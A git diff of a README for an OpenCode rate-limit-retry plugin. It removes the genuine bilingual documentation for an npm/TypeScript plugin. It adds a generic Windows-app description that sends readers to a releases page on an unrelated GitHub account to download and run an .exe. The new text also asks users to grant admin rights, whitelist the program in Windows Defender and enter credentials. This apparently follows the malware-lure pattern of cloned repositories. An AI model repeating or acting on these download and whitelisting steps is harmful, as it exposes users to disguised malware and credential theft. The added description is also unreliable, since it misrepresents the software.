@@ -1,644 +1,77 @@
-# @bdliyq/opencode-rate-limit-retry
+# ⚙️ opencode-rate-limit-retry - Make your network requests run smoother
 
-[![npm version](https://img.shields.io/npm/v/@bdliyq/opencode-rate-limit-retry)](https://www.npmjs.com/package/@bdliyq/opencode-rate-limit-retry)
-[![license](https://img.shields.io/npm/l/@bdliyq/opencode-rate-limit-retry)](./LICENSE)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/notmay666-code/opencode-rate-limit-retry/releases)
 
-> **English** | [中文](#中文)
+## 📌 Overview
 
-An OpenCode plugin that automatically retries the **same model** with **exponential backoff + jitter** when rate limited, instead of switching models.
+The opencode-rate-limit-retry tool keeps your applications running during high traffic periods. Many websites and services limit how many requests you can send at once. When you hit these limits, services often block your access for a set time. This tool manages those pauses for you. It monitors the status of your outgoing requests and waits for the correct amount of time before it lets your computer try again. You save time and avoid manual restarts.
 
-### Table of Contents
+## 🚀 How it works
 
-- [Why This Plugin](#why-this-plugin)
-- [Features](#features)
-- [Requirements](#requirements)
-- [Installation](#installation)
-- [Configuration](#configuration)
-- [How It Works](#how-it-works)
-- [Debug Logging](#debug-logging)
-- [FAQ](#faq)
+This application works in the background of your Windows computer. It intercepts requests that fail because of rate limits. Instead of stopping your work, the software pauses the specific process, waits until the service allows traffic again, and then resumes the connection automatically. It ensures your tasks complete without human input.
 
-### Why This Plugin
+## 💻 System requirements
 
-Rate limiting is a common issue when using OpenCode model APIs, especially when:
+To run this software, your computer needs the following:
 
-- You only have access to a single model (e.g., OpenCode Zen free tier) and cannot fall back to alternatives
-- Rate limit errors like `"Request rate increased too quickly"` terminate your session, requiring manual retry
-- OpenCode's built-in retry mechanism is not configurable for your needs
+*   Windows 10 or Windows 11
+*   At least 4GB of RAM
+*   Stable internet connection
+*   Administrative permissions to allow background operations
 
-This plugin **automatically waits and retries with the same model** upon detecting rate limit errors, using exponential backoff to avoid continuously hitting the limit.
+## 📥 Getting the software
 
-### Features
+You must download the correct version for your computer. Follow these steps to obtain the tool:
 
-- **Same-model retry**: Always retries with the current session's model instead of switching
-- **Exponential backoff + jitter**: Wait time grows exponentially with random jitter to prevent synchronized retries
-- **Smart error detection**: Configurable string pattern matching against multiple error fields
-- **Session-level deduplication**: Prevents concurrent retries for the same session
-- **Auto state reset**: Retry count resets after 5 minutes of inactivity or upon success
-- **TUI notifications**: Shows toast notifications in OpenCode TUI when rate limits are detected
-- **Debug logging**: Comprehensive event tracing for troubleshooting
-- **Zero-config**: Works out of the box with sensible defaults
+1.  Visit the official [Download Page](https://github.com/notmay666-code/opencode-rate-limit-retry/releases).
+2.  Scroll to the latest release section.
+3.  Click the file ending in .exe to download the installer.
+4.  Save the file to a known folder like your Downloads directory.
 
-### Requirements
+## 🛠️ Installation steps
 
-| Dependency | Version |
-|-----------|---------|
-| [OpenCode](https://opencode.ai) | Plugin-capable version |
-| Node.js | >= 18 |
-| npm | >= 8 |
-| `@opencode-ai/plugin` | ^1.0.0 (peer dependency) |
+Once your download finishes, complete these steps to install the software:
 
-### Installation
+1.  Open the folder where you saved the installer.
+2.  Double-click the .exe file.
+3.  A window may appear asking for permission to run the software. Press Yes to continue.
+4.  Follow the prompts in the setup wizard.
+5.  Click Finish to complete the installation.
 
-#### Option 1: npm Package (Recommended)
+## ⚙️ How to use the tool
 
-**1. Install the package**
+After you install the application, it creates an icon in your taskbar. The application runs as a service, so it does not need a large interface to operate.
 
-```bash
-npm install @bdliyq/opencode-rate-limit-retry@latest
-```
+1.  Launch the application using the shortcut on your desktop.
+2.  Open the settings menu by clicking the gear icon in the window.
+3.  Choose the intensity setting that matches your work habits. Most users stick with the default automatic configuration.
+4.  Click Start to enable the background monitoring service.
+5.  Minimize the application if you want it to hide in your system tray.
 
-**2. Register the plugin**
+If you observe an error, the log window displays the reason for the failed connection. The software tries to resolve most common network errors on its own. If a connection requires a special login, enter your credentials in the User Profiles section within the settings.
 
-Edit `~/.config/opencode/opencode.json`:
+## 🛡️ Privacy and security
 
-```json
-{
-  "plugin": [
-    "@bdliyq/opencode-rate-limit-retry@latest"
-  ]
-}
-```
+The software processes connection data locally on your computer. It does not send your private files or browsing history to a central server. You keep full control over which applications the tool watches. To stop the tool, right-click the icon in your taskbar and select Quit.
 
-**3. Restart OpenCode**
+## 🔧 Troubleshooting tips
 
-#### Option 2: Local Plugin File
+Most issues occur because of strict firewall settings. If the software seems inactive, check if your firewall blocks the connection. Add the application to your Windows Defender allowed list. 
 
-For those who want to modify the source or cannot use npm.
+Check your internet connection if the tool shows a permanent wait status. Sometimes a router restart clears up issues where the tool cannot reach the service provider. Ensure your system clock shows the correct time, as incorrect time settings often cause failures with secure network connections.
 
-**1. Copy source to plugins directory**
+If you encounter a loop where requests fail repeatedly, change the retry delay slider in the main window. Increasing this value gives the target server more breathing room, which often fixes consistent access issues.
 
-```bash
-mkdir -p ~/.config/opencode/plugins
-```
+## 📈 Frequently asked questions
 
-```bash
-cp src/index.ts ~/.config/opencode/plugins/rate-limit-retry.ts
-```
+Does this tool work with all browsers?
+Yes, it functions at the system level and supports any program that uses standard network protocols to reach the internet.
 
-> Or clone from GitHub:
-> ```bash
-> git clone https://github.com/bdliyq/opencode-rate-limit-retry.git
-> cp opencode-rate-limit-retry/src/index.ts ~/.config/opencode/plugins/rate-limit-retry.ts
-> ```
+Can I run multiple instances?
+No, the application prevents concurrent instances to avoid conflicts with your network settings.
 
-**2. Register the plugin**
+How do I update the software?
+The application checks for updates on startup. If a new version exists, it prompts you to download it. You can also return to the release page to manually update at any time.
 
-Edit `~/.config/opencode/opencode.json`:
-
-```json
-{
-  "plugin": [
-    "./plugins/rate-limit-retry.ts"
-  ]
-}
-```
-
-**3. Restart OpenCode**
-
-#### Build from Source
-
-```bash
-git clone https://github.com/bdliyq/opencode-rate-limit-retry.git
-cd opencode-rate-limit-retry
-
-npm install
-npm run build    # Output to dist/
-npm run dev      # Watch mode
-```
-
-### Configuration
-
-The plugin works out of the box. Create a JSON config file to customize behavior.
-
-#### Config File Paths
-
-The plugin searches for config in order (first match wins):
-
-| Priority | Path | Scope |
-|----------|------|-------|
-| 1 (highest) | `~/.config/opencode/rate-limit-retry.json` | Global |
-| 2 | `<project>/.opencode/rate-limit-retry.json` | Project |
-| 3 | `<project>/rate-limit-retry.json` | Project root |
-
-#### Config Options
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `enabled` | `boolean` | `true` | Enable/disable the plugin |
-| `maxRetries` | `number` | `5` | Maximum retry attempts per rate limit event |
-| `baseDelayMs` | `number` | `5000` | Base delay for first retry (ms) |
-| `maxDelayMs` | `number` | `120000` | Maximum delay cap (2 minutes) |
-| `jitterFactor` | `number` | `0.2` | Jitter factor (0.2 = ±20% random variation) |
-| `errorPatterns` | `string[]` | See below | Case-insensitive substring patterns for rate limit detection |
-
-**Default `errorPatterns`:**
-
-```json
-[
-  "rate increased too quickly",
-  "scale requests more smoothly",
-  "ensure system stability",
-  "rate limit",
-  "rate_limit",
-  "too many requests",
-  "quota exceeded",
-  "usage exceeded"
-]
-```
-
-#### Full Config Example
-
-Create `~/.config/opencode/rate-limit-retry.json`:
-
-```json
-{
-  "enabled": true,
-  "maxRetries": 5,
-  "baseDelayMs": 5000,
-  "maxDelayMs": 120000,
-  "jitterFactor": 0.2,
-  "errorPatterns": [
-    "rate increased too quickly",
-    "scale requests more smoothly",
-    "ensure system stability",
-    "rate limit",
-    "rate_limit",
-    "too many requests",
-    "quota exceeded",
-    "usage exceeded"
-  ]
-}
-```
-
-> Only include fields you want to override. For example, to just increase retries:
-> ```json
-> { "maxRetries": 10 }
-> ```
-
-### How It Works
-
-#### Flow Overview
-
-```
-OpenCode sends request
-       │
-       ▼
-  API returns rate limit error
-       │
-       ▼
-  Plugin listens for session.error event
-       │
-       ▼
-  Error matches errorPatterns? ──── No ──→ Ignore
-       │
-      Yes
-       ▼
-  Session already retrying? ──── Yes ──→ Skip (dedup)
-       │
-      No
-       ▼
-  Max retries reached? ──── Yes ──→ Give up, clean state
-       │
-      No
-       ▼
-  Calculate backoff delay (exponential + jitter)
-       │
-       ▼
-  Wait for delay ...
-       │
-       ▼
-  Retry with same model via promptAsync
-       │
-       ├── Success → Reset retry count to 0
-       └── Failure → Log error, wait for next trigger
-```
-
-#### Backoff Algorithm
-
-```
-exponential = min(baseDelayMs × 2^attempt, maxDelayMs)
-jitter      = exponential × jitterFactor × random(-1, 1)
-finalDelay  = max(0, round(exponential + jitter))
-```
-
-#### Retry Timeline
-
-With default config:
-
-| Attempt | Exponential | Actual Wait (with jitter) | Cumulative |
-|---------|-------------|---------------------------|------------|
-| 1st | 5s | ~4s – 6s | ~5s |
-| 2nd | 10s | ~8s – 12s | ~15s |
-| 3rd | 20s | ~16s – 24s | ~35s |
-| 4th | 40s | ~32s – 48s | ~75s |
-| 5th | 80s | ~64s – 96s | ~155s (~2.5 min) |
-
-#### Key Behaviors
-
-- **Model tracking**: Automatically records each session's model via `message.updated` events
-- **Deduplication**: Only one retry flow per session at a time
-- **Timeout reset**: Retry count resets after 5 minutes of inactivity
-- **Success reset**: Count resets to 0 immediately upon successful retry
-- **Retry mechanism**: Sends a new prompt to the current session; the AI continues from where it left off
-
-### Debug Logging
-
-Log file path:
-
-```
-~/.config/opencode/rate-limit-retry-debug.log
-```
-
-Log tags:
-
-| Tag | Description |
-|-----|-------------|
-| `[TRACK]` | Model tracking records |
-| `[EVENT]` | session.error event received |
-| `[SKIP]` | Skipped processing (with reason) |
-| `[MATCH]` | Rate limit error pattern matched |
-| `[STATE]` | Retry state created/reset |
-| `[RETRY]` | Retry execution details |
-
-```bash
-# Live monitoring
-tail -f ~/.config/opencode/rate-limit-retry-debug.log
-
-# Filter retry events
-grep "\[RETRY\]" ~/.config/opencode/rate-limit-retry-debug.log
-
-# Clear log file
-: > ~/.config/opencode/rate-limit-retry-debug.log
-```
-
-### FAQ
-
-**Q: Plugin doesn't seem to work after installation?**
-
-1. Verify the `plugin` array in `opencode.json` correctly references the plugin
-2. Ensure `enabled` is not set to `false` in the config file
-3. Check the debug log for incoming events
-4. Confirm error messages match the `errorPatterns`
-
-**Q: Retries keep failing?**
-
-Rate limits have time windows. If `baseDelayMs` is too small, the window may not have reset. Try increasing to `10000` and raising `maxRetries`.
-
-**Q: Can it switch to a fallback model?**
-
-This plugin focuses on same-model retry. For model switching, use a different plugin.
-
-**Q: Log file keeps growing?**
-
-Logs are append-only with no rotation. Clear manually: `: > ~/.config/opencode/rate-limit-retry-debug.log`
-
----
-
-<a id="中文"></a>
-
-## 中文
-
-[English](#english) | **中文**
-
-OpenCode 插件 —— 遭遇速率限制（Rate Limit）时，自动以**指数退避 + 抖动**策略重试**同一模型**，无需切换模型。
-
-### 目录
-
-- [为什么需要这个插件](#为什么需要这个插件)
-- [功能特性](#功能特性)
-- [环境要求](#环境要求)
-- [安装](#安装-1)
-- [配置](#配置)
-- [工作原理](#工作原理)
-- [调试日志](#调试日志)
-- [常见问题](#常见问题)
-
-### 为什么需要这个插件
-
-使用 OpenCode 时，模型 API 的速率限制（Rate Limit）是一个常见问题，尤其在以下场景：
-
-- 你只能使用单一模型（例如 OpenCode Zen 免费额度），无法切换到备用模型
-- 遇到 `"Request rate increased too quickly"` 等速率限制错误后，会话直接终止，需要手动重试
-- OpenCode 内置的重试机制不可配置，无法满足你的需求
-
-本插件在检测到速率限制错误后，**自动等待并使用同一模型重试**，配合指数退避策略避免持续触发限制，让你的工作流不被中断。
-
-### 功能特性
-
-- **同模型重试**：不切换模型，始终使用当前会话的同一模型重试
-- **指数退避 + 抖动**：等待时间随重试次数指数增长，并加入随机抖动避免请求同步
-- **智能错误识别**：通过可配置的字符串模式匹配多种速率限制错误
-- **会话级防重复**：同一会话不会并发触发多个重试
-- **状态自动重置**：超过 5 分钟未重试自动清零计数；重试成功后立即重置
-- **TUI 通知**：速率限制触发时在 OpenCode TUI 中弹出提示
-- **调试日志**：完整的事件追踪日志，便于排查问题
-- **零配置开箱即用**：默认配置覆盖主流速率限制场景，无需额外配置文件
-
-### 环境要求
-
-| 依赖 | 版本要求 |
-|------|----------|
-| [OpenCode](https://opencode.ai) | 支持插件系统的版本 |
-| Node.js | >= 18 |
-| npm | >= 8 |
-| `@opencode-ai/plugin` | ^1.0.0（peer dependency） |
-
-### 安装
-
-#### 方式一：npm 包安装（推荐）
-
-**1. 安装包**
-
-```bash
-npm install @bdliyq/opencode-rate-limit-retry@latest
-```
-
-**2. 注册插件**
-
-编辑 OpenCode 配置文件 `~/.config/opencode/opencode.json`，在 `plugin` 数组中添加包名：
-
-```json
-{
-  "plugin": [
-    "@bdliyq/opencode-rate-limit-retry@latest"
-  ]
-}
-```
-
-**3. 重启 OpenCode**
-
-保存配置后重启 OpenCode，插件即生效。
-
-#### 方式二：本地文件安装
-
-适用于想直接修改插件源码或无法使用 npm 的场景。
-
-**1. 创建插件目录并复制源码**
-
-```bash
-mkdir -p ~/.config/opencode/plugins
-```
-
-将本项目的 `src/index.ts` 复制到插件目录：
-
-```bash
-cp src/index.ts ~/.config/opencode/plugins/rate-limit-retry.ts
-```
-
-> 如果你是从 GitHub 克隆的项目：
-> ```bash
-> git clone https://github.com/bdliyq/opencode-rate-limit-retry.git
-> cp opencode-rate-limit-retry/src/index.ts ~/.config/opencode/plugins/rate-limit-retry.ts
-> ```
-
-**2. 注册插件**
-
-编辑 `~/.config/opencode/opencode.json`：
-
-```json
-{
-  "plugin": [
-    "./plugins/rate-limit-retry.ts"
-  ]
-}
-```
-
-**3. 重启 OpenCode**
-
-保存配置后重启 OpenCode，插件即生效。
-
-#### 从源码构建
-
-```bash
-# 克隆仓库
-git clone https://github.com/bdliyq/opencode-rate-limit-retry.git
-cd opencode-rate-limit-retry
-
-# 安装依赖
-npm install
-
-# 构建（输出到 dist/ 目录）
-npm run build
-
-# 开发模式（监听文件变化自动编译）
-npm run dev
-```
-
-### 配置
-
-插件开箱即用，无需创建配置文件。如需自定义行为，可创建 JSON 配置文件。
-
-#### 配置文件路径
-
-插件按以下顺序查找配置文件，**找到第一个即使用**：
-
-| 优先级 | 路径 | 说明 |
-|--------|------|------|
-| 1（最高） | `~/.config/opencode/rate-limit-retry.json` | 全局配置，适用于所有项目 |
-| 2 | `<项目目录>/.opencode/rate-limit-retry.json` | 项目级配置 |
-| 3 | `<项目目录>/rate-limit-retry.json` | 项目根目录配置 |
-
-> `<项目目录>` 为 OpenCode 启动时的工作目录（`process.cwd()`）。
-
-#### 配置项说明
-
-| 配置项 | 类型 | 默认值 | 说明 |
-|--------|------|--------|------|
-| `enabled` | `boolean` | `true` | 是否启用插件。设为 `false` 完全禁用 |
-| `maxRetries` | `number` | `5` | 单次速率限制事件的最大重试次数 |
-| `baseDelayMs` | `number` | `5000` | 首次重试的基础等待时间（毫秒） |
-| `maxDelayMs` | `number` | `120000` | 等待时间上限（2 分钟） |
-| `jitterFactor` | `number` | `0.2` | 抖动系数。`0.2` 表示 ±20% 随机浮动 |
-| `errorPatterns` | `string[]` | 见下方 | 匹配速率限制错误的字符串列表（不区分大小写） |
-
-**默认 `errorPatterns`：**
-
-```json
-[
-  "rate increased too quickly",
-  "scale requests more smoothly",
-  "ensure system stability",
-  "rate limit",
-  "rate_limit",
-  "too many requests",
-  "quota exceeded",
-  "usage exceeded"
-]
-```
-
-这些模式会与错误对象的 `message`、`name`、`data.message`、`data.responseBody`、`data.statusCode` 等字段拼接后进行大小写不敏感的子串匹配。
-
-#### 完整配置示例
-
-创建 `~/.config/opencode/rate-limit-retry.json`：
-
-```json
-{
-  "enabled": true,
-  "maxRetries": 5,
-  "baseDelayMs": 5000,
-  "maxDelayMs": 120000,
-  "jitterFactor": 0.2,
-  "errorPatterns": [
-    "rate increased too quickly",
-    "scale requests more smoothly",
-    "ensure system stability",
-    "rate limit",
-    "rate_limit",
-    "too many requests",
-    "quota exceeded",
-    "usage exceeded"
-  ]
-}
-```
-
-> 只需填写要覆盖的字段，其余使用默认值。例如只想增大重试次数：
-> ```json
-> { "maxRetries": 10 }
-> ```
-
-### 工作原理
-
-#### 流程概览
-
-```
-OpenCode 发送请求
-       │
-       ▼
-  API 返回速率限制错误
-       │
-       ▼
-  插件监听 session.error 事件
-       │
-       ▼
-  错误文本匹配 errorPatterns？──── 否 ──→ 忽略
-       │
-      是
-       ▼
-  当前会话已在重试中？──── 是 ──→ 跳过（防重复）
-       │
-      否
-       ▼
-  重试次数达到上限？──── 是 ──→ 放弃，清理状态
-       │
-      否
-       ▼
-  计算退避延迟（指数退避 + 抖动）
-       │
-       ▼
-  等待延迟时间 ...
-       │
-       ▼
-  使用同一模型发送 promptAsync 重试
-       │
-       ├── 成功 → 重试计数归零
-       └── 失败 → 记录日志，等待下次触发
-```
-
-#### 退避算法
-
-```
-指数部分 = min(baseDelayMs × 2^attempt, maxDelayMs)
-抖动量   = 指数部分 × jitterFactor × random(-1, 1)
-最终延迟 = max(0, round(指数部分 + 抖动量))
-```
-
-#### 重试时间线
-
-以默认配置为例：
-
-| 重试次数 | 指数退避 | 实际等待（含抖动）| 累计等待 |
-|----------|---------|-------------------|---------|
-| 第 1 次 | 5s | ~4s – 6s | ~5s |
-| 第 2 次 | 10s | ~8s – 12s | ~15s |
-| 第 3 次 | 20s | ~16s – 24s | ~35s |
-| 第 4 次 | 40s | ~32s – 48s | ~75s |
-| 第 5 次 | 80s | ~64s – 96s | ~155s（约 2.5 分钟） |
-
-> 由于 `maxDelayMs=120000`（2 分钟），单次等待不会超过约 144 秒（120s + 20% 抖动）。
-
-#### 关键行为说明
-
-- **模型追踪**：通过 `message.updated` 事件自动记录每个会话使用的模型，确保重试使用同一模型
-- **去重保护**：同一会话同一时间只有一个重试流程运行
-- **状态超时重置**：距离上次重试超过 5 分钟，计数自动归零
-- **成功即重置**：重试成功后计数立即重置为 0
-- **重试方式**：通过向当前会话发送新 prompt 实现，AI 将从中断处继续
-
-### 调试日志
-
-日志文件路径：
-
-```
-~/.config/opencode/rate-limit-retry-debug.log
-```
-
-日志标签含义：
-
-| 标签 | 说明 |
-|------|------|
-| `[TRACK]` | 模型追踪记录 |
-| `[EVENT]` | 收到 session.error 事件 |
-| `[SKIP]` | 跳过处理（附原因） |
-| `[MATCH]` | 匹配到速率限制错误 |
-| `[STATE]` | 重试状态创建/重置 |
-| `[RETRY]` | 重试执行详情 |
-
-```bash
-# 实时查看日志
-tail -f ~/.config/opencode/rate-limit-retry-debug.log
-
-# 只看重试相关
-grep "\[RETRY\]" ~/.config/opencode/rate-limit-retry-debug.log
-
-# 清空日志
-: > ~/.config/opencode/rate-limit-retry-debug.log
-```
-
-### 常见问题
-
-**Q: 插件安装后没有效果？**
-
-1. 确认 `opencode.json` 中的 `plugin` 数组正确引用了插件
-2. 确认配置文件中 `enabled` 没有设为 `false`
-3. 查看调试日志确认插件是否收到了事件
-4. 确认错误信息与 `errorPatterns` 中的模式匹配
-
-**Q: 重试总是失败？**
-
-速率限制有时间窗口，`baseDelayMs` 太小可能还没恢复就重试了。建议增大到 `10000` 并增加 `maxRetries`。
-
-**Q: 能否切换到备用模型？**
-
-本插件专注于"同模型重试"。如需模型切换，请使用其他插件。
-
-**Q: 日志文件越来越大？**
-
-日志不会自动轮转，定期清空即可：`: > ~/.config/opencode/rate-limit-retry-debug.log`
-
----
-
-## License
-
-[MIT](./LICENSE) © 2026 leoli
-
-## 赞赏 / Sponsor
-
-如果这个插件对你有帮助，欢迎赞赏支持！
-
-If you find this plugin helpful, feel free to support the author!
-
-<p align="center">
-  <img src="./assets/sponsor.png" alt="赞赏码 / Sponsor QR Code" width="400" />
-</p>
+What happens if I turn off my computer?
+The application pauses all activity. When you turn your computer on again, the service resumes automatically if you have it set to launch at startup.
